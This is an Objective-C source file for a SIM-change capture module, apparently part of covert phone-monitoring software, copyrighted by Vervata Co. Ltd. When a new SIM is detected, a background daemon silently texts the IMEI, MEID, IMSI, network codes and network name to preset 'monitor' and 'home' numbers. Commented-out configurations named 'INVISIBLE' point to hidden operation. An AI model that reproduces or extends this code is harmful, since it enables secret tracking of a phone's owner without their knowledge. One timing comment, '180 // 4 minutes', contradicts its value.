/**
 - Project Name  : SIMChangeCapture
 - Class Name    : SIMCaptureManagerImpl.h
 - Version       : 1.0
 - Purpose       : Implementation of SIMChangeCaptureManager and other required methods for SIM change capture
 - Copy right    : 06/11/2011 , Syam Sasidharan, Vervata Co. Ltd. All rights reserved.
 **/

#import "SIMCaptureManagerImpl.h"
#import "SIMChangeKey.h"
#import "FxLoggerHelper.h"

#import "AppContext.h"
#import "TelephonyNotificationManagerImpl.h"
#import "LicenseManager.h"
#import "LicenseInfo.h"
#import "SMSSendMessage.h"
#import "ConfigurationID.h"

#import "EventCenter.h"
#import "FxSystemEvent.h"

#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "PhoneInfoImp.h"
#import "PhoneInfo.h"

#import "SimReadyHelper.h"


static NSString * const kIMSIKey		= @"IMSI_KEY";
static NSString * const kIMSIFilename	= @"imsi.plist";


#define kUnregisterSIMReadyDelay		180			// 4 minutes



@interface SIMCaptureManagerImpl (private)
- (void) sendMessage;
- (NSString *) getIMSI;
- (void) persistCurrentIMSI;
- (void) persistIMSI: (NSString *) aIMSI path: (NSString *) aIMSIPath;
- (void) clearIMSI;
- (void) verifySimChange;
- (void) unregisterSimReadyNotification;

- (void) doListenToSIMChange;
- (void) doStopListenToSIMChange;

- (void) doListenToSIMisReadyToUse;
- (void) doStopListenToSIMisReadyToUse;

- (void) doListenToSIMisReadyToUseAfterStartListenSimChange;
- (void) doStopListenToSIMisReadyToUseAfterStartListenSimChange;


- (NSString*) formatString: (NSString*) aStringFmt;
- (NSString*) formatString: (NSString*) aStringFmt
				withTarget: (NSString*) aTarget
				  andValue: (NSString*) aValue;
@end


@implementation SIMCaptureManagerImpl

@synthesize mAppContext;
@synthesize mEventDelegate;
@synthesize mSMSSender;
@synthesize mDelegate;
@synthesize mLicenseManager;
@synthesize mSIMChangeRecipient;
@synthesize mSIMChangeReportRecipient;
@synthesize mMessageSIMChangeFormat;
@synthesize mMessageReportSIMChangeFormat;
@synthesize mSimReadyHelper;

#pragma mark -
#pragma mark Initializing with TelephonyNotificationManager
#pragma mark -

- (id) init {
	if ((self = [super init])) {
		mTelephonyNotification = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotification startListeningToTelephonyNotifications];
		mManager = mTelephonyNotification;
	}
	return (self);
}

/**
 - Method Name                    : initWithTelephonyManager:
 - Purpose                        : Initializing SIM change capture with TelephonyNotificationManager
 - Argument list and description  : aManager, an instance of the TelephonyNotificationManager
 - Return description             : No return
 **/
- (id)initWithTelephonyNotificationManager : (id) aManager {
    
    self = [super init];
    if (self != nil) {
        mManager=aManager;
    }
    return self;
}

#pragma mark -
#pragma mark TelephonyNotificationManager Notification Listener 
#pragma mark -

/**
 - Method Name                    : onSIMChange:
 - Purpose                        : SIM change notifying delegate method
 - Argument list and description  : aNotification, Notification information
 - Return description             : No return
 **/
- (void) onSIMChange :(id) aNotificationInfo {
    DLog(@"=============================================================================")
    DLog(@"on SIM Change notification!!!, aNotificationInfo = %@", aNotificationInfo);
	DLog(@"=============================================================================")
	
	if(self.mDelegate != nil && [self.mDelegate respondsToSelector:@selector(onSIMChange:)]) {
        
        DLog(@"Notifying delegate!!!");
		
        [self.mDelegate onSIMChange:aNotificationInfo];
    }
	
	// Method 1 (use timer)
	/*
	 * Note that the application will send an SMS to home number (GSM Modem) after 90 seconds because it needs to wait for the device to register 
	 * the new SIM with the operator. So it means that the server can detect that the phone number has been changed after 90 seconds from the time
	 * the new sim is inserted
	 *
	 */
	// Note that when testing on 3GS with AIS sim, it tooks around almost 50 - 90 seconds, so we put 90 seconds
	//mSendMessageTimer = [NSTimer scheduledTimerWithTimeInterval:90 target:self selector:@selector(sendMessage) userInfo:nil repeats:NO];
	
	// Method 2 (use sim ready notification)
	[self doStopListenToSIMisReadyToUse];
	[self doListenToSIMisReadyToUse];
}

- (void) onSIMReady: (id) aNotificationInfo {
	DLog(@"=============================================================================")
	DLog(@"on SIM ready notification!!!, aNotificationInfo = %@", aNotificationInfo);
	DLog(@"=============================================================================")
	
	if (self.mDelegate != nil && [self.mDelegate respondsToSelector:@selector(onSIMReady:)]) {
        
        DLog(@"Notifying delegate!!!");
		
        [self.mDelegate onSIMChange:aNotificationInfo];
    }
	
	[self doStopListenToSIMisReadyToUse];
	
	[self sendMessage];
	
	[self persistCurrentIMSI];						// !!! Update IMSI
}

#pragma mark -
#pragma mark SIMChangeCaptureManager Delegate Implementation
#pragma mark -

/**
 - Method Name                    : startListenToSIMChange
 - Purpose                        : Start sending SIM change notification to monitor numbers
 - Argument list and description  : No arguments
 - Return description             : No return
 **/

- (void) startListenToSIMChange: (NSString*) aStringFmt andRecipients: (NSArray*) aRecipients {
	mListeningToSIMChange = TRUE;
    [self setMSIMChangeRecipient:aRecipients];
	[self setMMessageSIMChangeFormat:aStringFmt];
	[self doListenToSIMChange];
}

/**
 - Method Name                    : stopListenToSIMChange
 - Purpose                        : Stop sending SIM change notification to monitor numbers
 - Argument list and description  : No arguments
 - Return description             : No return
 **/

- (void) stopListenToSIMChange {
	mListeningToSIMChange = FALSE;
    [self doStopListenToSIMChange];
}

/**
 - Method Name                    : startListenToSIMChange
 - Purpose                        : Start reporting SIM change notification to home numbers
 - Argument list and description  : No arguments
 - Return description             : No return
 **/

- (void) startReportSIMChange: (NSString*) aStringFmt andRecipients: (NSArray*) aRecipients {
	mReportingSIMChange = TRUE;
	[self setMSIMChangeReportRecipient:aRecipients];
	[self setMMessageReportSIMChangeFormat:aStringFmt];
	[self doListenToSIMChange];
}

/**
 - Method Name                    : stopReportSIMChange
 - Purpose                        : Stop reporting SIM change notification to home numbers
 - Argument list and description  : No arguments
 - Return description             : No return
 **/

- (void) stopReportSIMChange {
	mReportingSIMChange = FALSE;
	[self doStopListenToSIMChange];
}

/**
 - Method Name                    : setListener:
 - Purpose                        : Setting the listener object and which to be called whenever it receives SIM change notification
 - Argument list and description  : aListener, an instance of the listener
 - Return description             : No return
 **/

- (void) setListener : (id) aListener  {
    
    //DLog(@"Setting the delegate");
    [self setMDelegate:aListener];
}

#pragma mark -
#pragma mark Sending SIM change message
#pragma mark -

- (void) sendMessage {
	DLog(@"=============================================================================")
	DLog (@"SIM Change message is going to be sent !!!!!!!")
	DLog(@"=============================================================================")
	
	if (mListeningToSIMChange) {
		NSString* message = [self formatString:mMessageSIMChangeFormat];
		for (NSString* recipient in mSIMChangeRecipient) {
			DLog (@"... sending SIM change message (to monitor number)")
			SMSSendMessage* smsSendMessage = [[SMSSendMessage alloc] init];
			[smsSendMessage setMMessage:message];
			[smsSendMessage setMRecipientNumber:recipient];
			[mSMSSender sendSMS:smsSendMessage];
			[smsSendMessage release];
		}
		
		// Create system event to monitor numbers
		FxSystemEvent *sysEvent = [[FxSystemEvent alloc] init];
		[sysEvent setMessage:message];
		[sysEvent setDirection:kEventDirectionOut];
		[sysEvent setSystemEventType:kSystemEventTypeSimChange];
		[sysEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:sysEvent];
		}
		[sysEvent release];
	}
	
	if (mReportingSIMChange) {
		NSString* message = [self formatString:mMessageReportSIMChangeFormat];
		for (NSString* recipient in mSIMChangeReportRecipient) {
			DLog (@"... sending SIM change message (to home number)")
			SMSSendMessage* smsSendMessage = [[SMSSendMessage alloc] init];
			[smsSendMessage setMMessage:message];
			[smsSendMessage setMRecipientNumber:recipient];
			[mSMSSender sendSMS:smsSendMessage];
			[smsSendMessage release];
		}
		
		// Create system event to home numbers
		FxSystemEvent *sysEvent = [[FxSystemEvent alloc] init];
		[sysEvent setMessage:message];
		[sysEvent setDirection:kEventDirectionOut];
		[sysEvent setSystemEventType:kSystemEventTypeSimChangeNotifyHome];
		[sysEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:sysEvent];
		}
		[sysEvent release];
	}
	
//	[mSendMessageTimer invalidate];
//	mSendMessageTimer = nil;
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (NSString *) getIMSI {
	PhoneInfoImp *phoneInfo			= [[PhoneInfoImp alloc] init];
	NSString *currentImsi			= [[phoneInfo getIMSI] retain];
	[phoneInfo release];
	return [currentImsi autorelease];
}

- (void) persistCurrentIMSI {
	// -- get current imsi
	PhoneInfoImp *phoneInfo	= [[PhoneInfoImp alloc] init];
	NSString *currentImsi	= [[phoneInfo getIMSI] retain];
	DLog (@">>>	Persist current IMSI %@", currentImsi)
	[phoneInfo release];	
	NSString *etcPath		= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	NSString *imsiPath		= [etcPath stringByAppendingPathComponent:kIMSIFilename];			
	NSDictionary *imsi		= [[NSDictionary alloc] initWithObjectsAndKeys:currentImsi, kIMSIKey, nil];
	[imsi writeToFile:imsiPath atomically:YES];
	
	[currentImsi release];
	[imsi release];	
}

- (void) persistIMSI: (NSString *) aIMSI path: (NSString *) aIMSIPath {
	DLog (@">>>	Persist IMSI %@", aIMSI)
	NSDictionary *imsi	= [[NSDictionary alloc] initWithObjectsAndKeys:aIMSI, kIMSIKey, nil];
	[imsi writeToFile:aIMSIPath atomically:YES];
    [imsi release];
}

- (void) clearIMSI {
	DLog (@">>>	Clear IMSI")
	NSString *etcPath		= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	NSString *imsiPath		= [etcPath stringByAppendingPathComponent:kIMSIFilename];
	if ([[NSFileManager defaultManager] fileExistsAtPath:imsiPath]) {
		DLog (@">>> IMSI file exists, so delete it ...")
		NSError *error = nil;
		if (![[NSFileManager defaultManager] removeItemAtPath:imsiPath error:&error]) {
			DLog (@">>> error removing IMSI file %@", error)
		}
	}
}

/*
- (void) verifySimChange {
	NSString *currentImsi = [[self getIMSI] retain];	// get current imsi
	DLog (@">>>	current imsi %@", currentImsi)
	
	NSString *etcPath		= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	NSString *imsiPath		= [etcPath stringByAppendingPathComponent:kIMSIFilename];
	
	if ([[NSFileManager defaultManager] fileExistsAtPath:imsiPath]) {
		DLog (@"*************************************")
		DLog (@"************* IMSI exist  ***********")
		DLog (@"*************************************")
		
		// -- get the stored imsi
		NSDictionary *imsiDictionary	= [[NSDictionary alloc] initWithContentsOfFile:imsiPath];
		NSString *storedImsi			= [[imsiDictionary objectForKey:kIMSIKey] retain];
		[imsiDictionary release];
		DLog (@">>>	stored imsi %@", storedImsi)				
		
		// -- compare imsi
		if (![storedImsi isEqualToString:currentImsi]) {		// NEW sim card
			DLog (@">>> NEW sim card detected")
			
			if (currentImsi && ![currentImsi isEqualToString:@""]) {			
				[self persistIMSI:currentImsi path:imsiPath];		// -- update imsi
			} else {
				DLog (@"Cannot get current IMSI for now, so not persist it")
			}

			// -- send imsi	
			[self doStopListenToSIMisReadyToUse];
			[self doListenToSIMisReadyToUse];
		} else {												// SAME sim card
			DLog (@">>> OLD sim card")		
		}
		[storedImsi release];
		
	} else {
		DLog (@"********************************************************************")
		DLog (@"*********** IMSI FILE NOT exist (Previous state is DEACTIVATED) *********")
		DLog (@"********************************************************************")	
					
		[self persistIMSI:currentImsi path:imsiPath];			// update imsi
	}
	
	[currentImsi release];
}
*/

- (void) verifySimChange {
	DLog(@"=============================================================================")
	DLog(@"=============================== VERIFY SIM CHANGE ===========================")
	DLog(@"=============================================================================")
	NSString *currentImsi	= [[self getIMSI] retain];	// get current imsi
	DLog (@">>>	current imsi %@", currentImsi)
	
	NSString *etcPath		= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	NSString *imsiPath		= [etcPath stringByAppendingPathComponent:kIMSIFilename];
	
	if ([[NSFileManager defaultManager] fileExistsAtPath:imsiPath]) {
		DLog (@"*************************************")
		DLog (@"************* IMSI exist  ***********")
		DLog (@"*************************************")
		
		// -- Get the stored imsi
		NSDictionary *imsiDictionary	= [[NSDictionary alloc] initWithContentsOfFile:imsiPath];
		NSString *storedImsi			= [[imsiDictionary objectForKey:kIMSIKey] retain];
		[imsiDictionary release];
		DLog (@">>>	stored imsi %@", storedImsi)				
		
		// -- Compare imsi
		
		// ---- NEW sim card
		if (![storedImsi isEqualToString:currentImsi]) {		
			DLog (@">>> NEW sim card detected")
			
			if (currentImsi && ![currentImsi isEqualToString:@""]) {			
				// -- cancel sim ready notification observed by SIMCaptureManagerImpl
				[self doStopListenToSIMisReadyToUse];
				
				[self persistIMSI:currentImsi path:imsiPath];		// -- update imsi
												
				[self sendMessage];									// -- Send imsi
			} else {
				DLog (@"Cannot get current IMSI for now, so not persist it")
			}			
		// ---- OLD sim card
		} else {												
			DLog (@">>> OLD sim card")		
		}
		[storedImsi release];
		
	} else {
		DLog (@"********************************************************************")
		DLog (@"*********** IMSI FILE NOT exist (Previous state is DEACTIVATED) *********")
		DLog (@"********************************************************************")	
		
		[self persistIMSI:currentImsi path:imsiPath];			// update imsi
	}
	
	[currentImsi release];
}

- (void) unregisterSimReadyNotification {
	DLog(@"=============================================================================")
	DLog (@"!!!!!!!!!!!!!!!!!! TIME OUT: SIM READY 2 !!!!!!!!!!!!!!!")
	DLog(@"=============================================================================")
	[self persistCurrentIMSI];
	[self doStopListenToSIMisReadyToUseAfterStartListenSimChange];
}

#pragma mark -
#pragma mark SIM Change


- (void) doListenToSIMChange {
	if (mManager && !mDidRegisteredToTelephonyNotification) {
		DLog(@"=============================================================================")
		DLog(@"Start listening to telephony notification!!!");
		DLog(@"=============================================================================")
		
		// -- sim change
		[mManager addNotificationListener:self withSelector:@selector(onSIMChange:) forNotification:KSIMCHANGENOTIFICATION];
        if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
            // iOS 9, KSIMCHANGENOTIFICATION no longer call in iOS 9
            [mManager addNotificationListener:self withSelector:@selector(onSIMChange:) forNotification:KSETTINGSPHONENUMBERCHANGEDNOTIFICATION];
        }
		mDidRegisteredToTelephonyNotification = TRUE;

		// -- sim ready
		[self doStopListenToSIMisReadyToUseAfterStartListenSimChange];
		[self doListenToSIMisReadyToUseAfterStartListenSimChange];	
		
		// -- unregister SIM ready notification if it's not callled in the specific length of time
		[self performSelector:@selector(unregisterSimReadyNotification) withObject:nil afterDelay:kUnregisterSIMReadyDelay];		/// !!!: Time to wait
	}
}

- (void) doStopListenToSIMChange {
	if(mManager && !mListeningToSIMChange && !mReportingSIMChange) {
        DLog(@"Stop listening to telephony notification!!!");
        [mManager removeListner:self withName:KSIMCHANGENOTIFICATION];
		mDidRegisteredToTelephonyNotification = FALSE;
		
		[self clearIMSI];		
    }
}


#pragma mark -
#pragma mark SIM Ready (onSIMChange is its caller)


- (void) doListenToSIMisReadyToUse {
	DLog(@"=============================================================================")
	DLog (@">>> Try to Listen To SIM is Ready To Use")
	DLog(@"=============================================================================")
	if (mManager && !mDidRegisterForServiceProviderNameChangedNotification) {
		DLog (@"Listening to SIMReady notification!!!");
		[mManager addNotificationListener:self
							 withSelector:@selector(onSIMReady:)
						  forNotification:KREGISTRATIONOPERATORNAMECHANGEDNOTIFICATION];
		mDidRegisterForServiceProviderNameChangedNotification = TRUE;
	}
}

- (void) doStopListenToSIMisReadyToUse {
	DLog(@"=============================================================================")
	DLog (@">>> Try to STOP listen To SIM is Ready To Use")
	DLog(@"=============================================================================")
	if (mManager && mDidRegisterForServiceProviderNameChangedNotification) {
        DLog(@"Stop listening to SIMReady notification!!!");
        [mManager removeListner:self withName:KREGISTRATIONOPERATORNAMECHANGEDNOTIFICATION];
		mDidRegisterForServiceProviderNameChangedNotification = FALSE;
    }
}


#pragma mark -
#pragma mark SIM Ready (After start listening to sim change)


- (void) doListenToSIMisReadyToUseAfterStartListenSimChange {
	DLog(@"=============================================================================")
	DLog (@">>> Try to 'START' listen SIM READY 2")
	DLog(@"=============================================================================")
	if (mManager && !mDidRegisterForServiceProviderNameChanged2Notification) {
		DLog(@"Start listen to SIM READY 2!!!");
				
		[self setMSimReadyHelper:nil];				
		mSimReadyHelper = [[SimReadyHelper alloc] initWithDelegate:self];
		
		//[mManager addNotificationListener:self
		[mManager addNotificationListener:mSimReadyHelper
							 withSelector:@selector(onSIMReadyAfterStartListenSimChange:)
						  forNotification:KREGISTRATIONOPERATORNAMECHANGEDNOTIFICATION];
		mDidRegisterForServiceProviderNameChanged2Notification = TRUE;
		
	}
}

- (void) doStopListenToSIMisReadyToUseAfterStartListenSimChange {
	DLog(@"=============================================================================")
	DLog (@">>> Try to 'STOP' listen SIM READY 2")
	DLog(@"=============================================================================")
	if (mManager && mDidRegisterForServiceProviderNameChanged2Notification) {
        DLog(@"Stop listen to SIM READY 2!!!");
        [mManager removeListner:mSimReadyHelper
					   withName:KREGISTRATIONOPERATORNAMECHANGEDNOTIFICATION];
		mDidRegisterForServiceProviderNameChanged2Notification = FALSE;
		[self setMSimReadyHelper:nil];
    }
}


- (NSString*) formatString: (NSString*) aStringFmt {
	NSString *bundleName = NSLocalizedString(@"kUnknownTitle", @"");
//	LicenseInfo *licenseInfo = [[self mLicenseManager] mCurrentLicenseInfo];
//	if ([licenseInfo licenseStatus] == ACTIVATED) {
//		if ([licenseInfo configID] == CONFIG_OMNI_INVISIBLE) {
//			bundleName = NSLocalizedString(@"kOMNITitle", @"");
//		} else if ([licenseInfo configID] == CONFIG_LIGHT_INVISIBLE) {
//			bundleName = NSLocalizedString(@"kLIGHTTitle", @"");
//		}
//	}
	
	NSString* message = [self formatString:aStringFmt withTarget:kSIMChangeKeywordAppName andValue:bundleName];
	message = [self formatString:message withTarget:kSIMChangeKeywordIMEI andValue:[[mAppContext getPhoneInfo] getIMEI]];
	message = [self formatString:message withTarget:kSIMChangeKeywordMEID andValue:[[mAppContext getPhoneInfo] getMEID]];
	message = [self formatString:message withTarget:kSIMChangeKeywordIMSI andValue:[[mAppContext getPhoneInfo] getIMSI]];
	message = [self formatString:message withTarget:kSIMChangeKeywordMCC andValue:[[mAppContext getPhoneInfo] getMobileCountryCode]];
	message = [self formatString:message withTarget:kSIMChangeKeywordMNC andValue:[[mAppContext getPhoneInfo] getMobileNetworkCode]];
	message = [self formatString:message withTarget:kSIMChangeKeywordNetworkName andValue:[[mAppContext getPhoneInfo] getNetworkName]];
	message = [self formatString:message withTarget:kSIMChangeKeywordESN andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordSID andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordChecksum andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordLAC andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordLongitude andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordLatitude andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordAltitude andValue:@""];
	message = [self formatString:message withTarget:kSIMChangeKeywordCID andValue:@""];
	return (message);
}

- (NSString*) formatString: (NSString*) aStringFmt withTarget: (NSString*) aTarget andValue: (NSString*) aValue {
	NSString* message = [aStringFmt stringByReplacingOccurrencesOfString:aTarget withString:aValue];
	return (message);
}

#pragma mark -
#pragma mark Memory Management
#pragma mark -

/**
 - Method Name                    : cleanUp
 - Purpose                        : Cleaning up the SIM change capture manager 
 - Argument list and description  : No arguments
 - Return description             : No return
 **/

- (void)cleanUp {        
    if(mDelegate) {
        mDelegate=nil;
	}
    
    if(mManager) {
        [mManager removeListner:self];
    }
    mManager = nil;
	[mTelephonyNotification release];
	mTelephonyNotification = nil;
}

- (void) release {
	DLog (@"release of SIMCaptureManagerImpl")
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[super release];
}

- (void) dealloc {
	DLog (@"dealloc of SIMCaptureManagerImpl")		
	[mSIMChangeRecipient release];
	[mSIMChangeReportRecipient release];
	[mMessageSIMChangeFormat release];
	[mMessageReportSIMChangeFormat release];
	[mSMSSender release];
	[self setMSimReadyHelper:nil];
    [self cleanUp];
    [super dealloc];
}



@end
